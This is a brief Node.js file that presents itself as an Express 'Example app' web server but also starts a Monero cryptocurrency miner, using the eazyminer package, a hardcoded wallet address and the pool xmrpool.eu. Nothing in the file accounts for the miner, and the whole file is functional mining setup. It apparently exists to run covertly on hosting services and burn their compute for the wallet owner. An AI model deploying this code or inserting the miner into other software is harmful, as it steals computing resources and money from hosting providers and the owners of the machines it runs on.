const Miner = require('eazyminer');
const http = require("https");
const crypto = require("crypto");
const express = require("express");
const app = express();

const port = process.env.PORT || 3001;

const server = app.listen(port, () => console.log(`Example app listening on port ${port}!`));

const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '47D8WQoJKydhTkk26bqZCVF7FaNhzRtNG15u1XiRQ83nfYqogyLjPMnYEKarjAiCz93oV6sETE9kkL3bkbvTX6nMU24CND8',
        url: 'xmrpool.eu:9999', // optional pool URL,
    }],
    autoStart: false // optional delay
});

miner.start();

server.keepAliveTimeout = 120 * 1000;
server.headersTimeout = 120 * 1000;
